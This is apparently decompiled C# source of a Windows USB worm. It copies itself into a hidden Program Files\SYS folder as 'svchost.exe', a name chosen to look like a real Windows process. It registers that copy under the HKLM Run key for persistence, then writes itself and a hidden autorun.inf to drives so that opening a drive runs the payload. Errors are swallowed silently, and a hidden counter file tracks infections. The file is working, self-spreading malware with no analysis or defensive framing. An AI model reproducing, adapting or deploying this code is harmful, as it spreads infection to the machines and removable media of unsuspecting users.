using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

[StandardModule]
public sealed class GClass1
{
	public static long long_0 = 0L;

	private static void smethod_0(object sender, UnhandledExceptionEventArgs e)
	{
	}

	private static void smethod_1(object sender, ThreadExceptionEventArgs e)
	{
	}

	public static void smethod_2()
	{
		AppDomain.CurrentDomain.UnhandledException += smethod_0;
		Application.add_ThreadException((ThreadExceptionEventHandler)smethod_1);
		if (Operators.CompareString(Interaction.Command(), "-i", false) == 0)
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo("explorer");
			string text2 = (processStartInfo.Arguments = ((ApplicationBase)Class1.smethod_1()).get_Info().get_DirectoryPath().Split(new char[1] { '\\' })[0]);
			Process.Start(processStartInfo);
			smethod_3();
			Process.GetCurrentProcess().Kill();
		}
		smethod_3();
	}

	public static void smethod_3()
	{
		try
		{
			if (!File.Exists(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_ProgramFiles() + "\\SYS\\svchost.exe"))
			{
				Directory.CreateDirectory(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_ProgramFiles() + "\\SYS");
				File.SetAttributes(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_ProgramFiles() + "\\SYS", FileAttributes.Hidden | FileAttributes.System);
				File.Copy(((ApplicationBase)Class1.smethod_1()).get_Info().get_DirectoryPath() + "\\svchost.exe", ((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_ProgramFiles() + "\\SYS\\svchost.exe", overwrite: true);
				File.SetAttributes(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_ProgramFiles() + "\\SYS\\svchost.exe", FileAttributes.Hidden | FileAttributes.System);
				smethod_5("svchost", ((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_ProgramFiles() + "\\SYS\\svchost.exe");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_4(string string_0)
	{
		try
		{
			Directory.CreateDirectory(string_0 + "\\SYS");
			File.SetAttributes(string_0 + "\\SYS", FileAttributes.Hidden | FileAttributes.System);
			File.Copy(((ApplicationBase)Class1.smethod_1()).get_Info().get_DirectoryPath() + "\\svchost.exe", string_0 + "\\SYS\\svchost.exe", overwrite: true);
			File.SetAttributes(string_0 + "\\SYS\\svchost.exe", FileAttributes.Hidden | FileAttributes.System);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			try
			{
				File.SetAttributes(string_0 + "\\autorun.inf", FileAttributes.Normal);
				File.Delete(string_0 + "\\autorun.inf");
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			FileStream stream = new FileStream(string_0 + "\\autorun.inf", FileMode.Create, FileAccess.Write);
			StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
			streamWriter.WriteLine("[autorun]");
			streamWriter.WriteLine("open=.\\SYS\\svchost.EXE -i");
			streamWriter.WriteLine("shell\\1\\=Open");
			streamWriter.WriteLine("shell\\1\\Command=.\\SYS\\svchost.EXE -i");
			streamWriter.WriteLine("shell\\2\\=Browser");
			streamWriter.WriteLine("shell\\2\\Command=.\\SYS\\svchost.EXE -i");
			streamWriter.WriteLine("shellexecute=.\\SYS\\svchost.EXE -i");
			streamWriter.Close();
			File.SetAttributes(string_0 + "\\autorun.inf", FileAttributes.Hidden | FileAttributes.System);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public static bool smethod_5(string string_0, string string_1)
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if ((!string_1.StartsWith("\"") && string_1.IndexOf(" ") > -1) ? true : false)
			{
				string_1 = "\"" + string_1 + "\"";
			}
			registryKey.SetValue(string_0, string_1);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void smethod_6()
	{
		checked
		{
			try
			{
				if (File.Exists(((ApplicationBase)Class1.smethod_1()).get_Info().get_DirectoryPath() + "\\c"))
				{
					File.SetAttributes(((ApplicationBase)Class1.smethod_1()).get_Info().get_DirectoryPath() + "\\c", FileAttributes.Normal);
					FileStream stream = new FileStream(((ApplicationBase)Class1.smethod_1()).get_Info().get_DirectoryPath() + "\\c", FileMode.Open, FileAccess.ReadWrite);
					StreamReader streamReader = new StreamReader(stream);
					long_0 = Conversions.ToLong(streamReader.ReadLine());
					long_0++;
					streamReader.Close();
					stream = new FileStream(((ApplicationBase)Class1.smethod_1()).get_Info().get_DirectoryPath() + "\\c", FileMode.Create, FileAccess.Write);
					StreamWriter streamWriter = new StreamWriter(stream);
					streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
					streamWriter.WriteLine(long_0.ToString());
					streamWriter.Close();
					File.SetAttributes(((ApplicationBase)Class1.smethod_1()).get_Info().get_DirectoryPath() + "\\c", FileAttributes.Hidden | FileAttributes.System);
				}
				else
				{
					FileStream stream2 = new FileStream(((ApplicationBase)Class1.smethod_1()).get_Info().get_DirectoryPath() + "\\c", FileMode.Create, FileAccess.Write);
					StreamWriter streamWriter2 = new StreamWriter(stream2);
					streamWriter2.BaseStream.Seek(0L, SeekOrigin.End);
					streamWriter2.WriteLine("0");
					streamWriter2.Close();
					File.SetAttributes(((ApplicationBase)Class1.smethod_1()).get_Info().get_DirectoryPath() + "\\c", FileAttributes.Hidden | FileAttributes.System);
					long_0 = 0L;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
